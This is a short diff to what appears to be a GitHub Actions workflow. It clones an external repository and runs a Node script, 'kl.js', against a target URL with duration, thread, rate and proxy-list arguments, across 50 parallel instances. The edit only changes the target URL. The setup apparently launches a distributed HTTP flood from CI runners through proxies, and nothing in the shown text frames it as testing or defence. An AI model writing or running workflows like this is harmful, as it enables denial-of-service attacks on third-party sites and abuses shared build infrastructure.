@@ -42,7 +42,7 @@ jobs:
         run: |
           git clone https://github.com/vrbrh921-glitch/Fc.git
           cd Fc
-          node kl.js GET https://request.countbot.win/ 650 4 120 proxy.txt --debug  --full
+          node kl.js GET https://c2.dstatbot.win/IhePql4L 650 4 120 proxy.txt --debug  --full
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
